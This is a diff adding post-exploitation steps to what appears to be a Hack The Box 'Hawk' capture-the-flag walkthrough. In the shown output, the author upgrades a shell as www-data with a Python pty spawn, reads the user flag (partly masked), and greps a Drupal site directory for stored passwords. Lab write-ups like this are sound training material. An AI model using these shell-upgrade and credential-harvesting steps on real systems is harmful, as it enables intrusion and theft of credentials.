@@ -148,5 +148,12 @@ AND BIM !!!
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
     /bin/sh: 0: can't access tty; job control turned off
     $ python3 -c "import pty;pty.spawn('/bin/bash')"
-    www-data@hawk:/$
+    www-data@hawk:/$ cd /home/daniel
+    www-data@hawk:/home/daniel$ cat user.txt
+    d5111d4f75370ebd01cd**********
     
+We have to login in SSH, go to var /www/html/sites/default/
+    
+    www-data@hawk:/var/www/html/sites/default$ grep password -r .
+    
+[![forthebadge made-with-python](http://www.noelshack.com/2018-48-6-1543664102-capture-du-2018-12-01-12-31-37.png)](https://hackthebox.eu)
